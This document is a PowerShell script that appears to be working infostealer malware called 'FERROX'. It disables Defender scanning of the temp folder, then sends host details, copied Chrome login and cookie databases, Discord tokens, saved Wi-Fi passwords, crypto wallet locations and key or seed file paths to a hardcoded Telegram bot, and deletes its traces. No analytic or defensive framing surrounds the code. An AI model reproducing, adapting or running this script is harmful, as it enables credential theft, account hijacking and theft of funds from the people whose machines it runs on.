Add-MpPreference -ExclusionPath $env:TEMP -EA 0
$BT="8875226322:AAFsOazAfQOy5rlP1LQSM2JPX0YiPXQZPSM"
$CI="8468737863"
function TG($t){try{$u="https://api.telegram.org/bot$BT/sendMessage";$b="chat_id=$CI&text=$([Uri]::EscapeDataString($t))";(New-Object Net.WebClient).UploadString($u,$b)|Out-Null}catch{}}
TG "FERROX ONLINE: $env:COMPUTERNAME / $env:USERNAME"

$hostname=$env:COMPUTERNAME
$user=$env:USERNAME
$os=(Get-WmiObject Win32_OperatingSystem).Caption
$ram=[math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,1)
$cpu=(Get-WmiObject Win32_Processor).Name
try{$ip=(Invoke-WebRequest "https://api.ipify.org" -UseBasicParsing -TimeoutSec 5).Content}catch{$ip="???"}
TG "HOST: $hostname | USER: $user | OS: $os | RAM: ${ram}GB | CPU: $cpu | IP: $ip"

$chrome="$env:LOCALAPPDATA\Google\Chrome\User Data"
if(Test-Path $chrome){Get-ChildItem $chrome -Recurse -Include "Login Data","Cookies","Web Data","History" -EA 0|%{
$tmp="$env:TEMP\chrome_$((Get-Date).Ticks).db";Copy-Item $_.FullName $tmp -Force -EA 0
$u2="https://api.telegram.org/bot$BT/sendDocument"
$bd="----FX$(Get-Random)";$nl="`r`n"
$h="--$bd$($nl)Content-Disposition: form-data; name=`"chat_id`"$($nl)$($nl)$CI$($nl)"
$h+="--$bd$($nl)Content-Disposition: form-data; name=`"caption`"$($nl)$($nl)$($_.Name)$($nl)"
$h+="--$bd$($nl)Content-Disposition: form-data; name=`"document`"; filename=`"$($_.Name)`"$($nl)Content-Type: application/octet-stream$($nl)$($nl)"
$f="--$bd--$($nl)"
$bh=[Text.Encoding]::UTF8.GetBytes($h);$bf=[Text.Encoding]::UTF8.GetBytes($f)
$bb=[IO.File]::ReadAllBytes($tmp)
$all=New-Object byte[]($bh.Length+$bb.Length+$bf.Length)
[Buffer]::BlockCopy($bh,0,$all,0,$bh.Length)
[Buffer]::BlockCopy($bb,0,$all,$bh.Length,$bb.Length)
[Buffer]::BlockCopy($bf,0,$all,$bh.Length+$bb.Length,$bf.Length)
$wc=New-Object Net.WebClient
$wc.Headers.Add("Content-Type","multipart/form-data; boundary=$bd")
$wc.UploadData($u2,"POST",$all)|Out-Null
Remove-Item $tmp -Force -EA 0
};TG "CHROME: done"}

$discord="$env:APPDATA\discord\Local Storage\leveldb"
if(Test-Path $discord){Get-ChildItem $discord -Filter "*.ldb" -EA 0|%{
$c=Get-Content $_.FullName -Raw -EA 0
if($c -and $c -match '[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}'){TG "DISCORD: $($Matches[0])"}
}}

$wifi=netsh wlan show profiles 2>&1|Select-String ":\s+"|%{$_ -replace '.*:\s+',''}
foreach($p in $wifi){$d=netsh wlan show profile name="$p" key=clear;$k=$d|Select-String "Key Content"|%{$_ -replace '.*:\s+',''};TG "WIFI: $p = $k"}

$wallets=@("$env:APPDATA\Exodus","$env:APPDATA\atomic","$env:APPDATA\Electrum","$env:APPDATA\Ledger Live","$env:APPDATA\metamask-desktop","$env:APPDATA\phantom","$env:LOCALAPPDATA\Ronin")
foreach($w in $wallets){if(Test-Path $w){TG "WALLET: $w"}}

Get-ChildItem "$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents" -Recurse -Include "*.kdbx","*.seed","*.wallet","*.pem","*.key" -EA 0 -Depth 3|%{TG "FILE: $($_.FullName)"}

TG "FERROX COMPLETE"
Remove-Item "$env:TEMP\chrome_*.db" -Force -EA 0
